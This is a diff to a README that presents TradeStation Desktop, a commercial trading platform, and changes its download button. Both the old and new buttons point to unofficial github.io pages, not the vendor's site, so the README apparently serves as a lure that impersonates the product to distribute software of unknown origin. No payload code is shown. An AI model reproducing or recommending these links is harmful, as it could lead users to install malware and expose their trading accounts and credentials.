@@ -4,7 +4,7 @@
 <img src="https://cdn-1.webcatalog.io/catalog/tradestation/tradestation-icon-filled-256.png?v=1714776219620" alt="TradeStation Logo" width="256" height="256">  
 </div>  
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://corbinshermanbfbk.github.io/.github/TradeStation)
+[![Launch TradeStation](https://img.shields.io/badge/Launch-TradeStation-1D4ED8?style=for-the-badge)](https://platform-tradestation.github.io/.github/)
 
 ---
 
@@ -38,9 +38,6 @@ Key features of TradeStation Desktop include:
 
 TradeStation Desktop is suitable for active traders, systematic developers, options strategists, and portfolio managers seeking a robust and reliable platform for professional trading on Apple computers.
 
----
-
-![TradeStation Radar](https://www.tradestation.com/wp-content/uploads/ss-desktop-radarscreen-1920x1080-1.jpg)
 
 ---
 
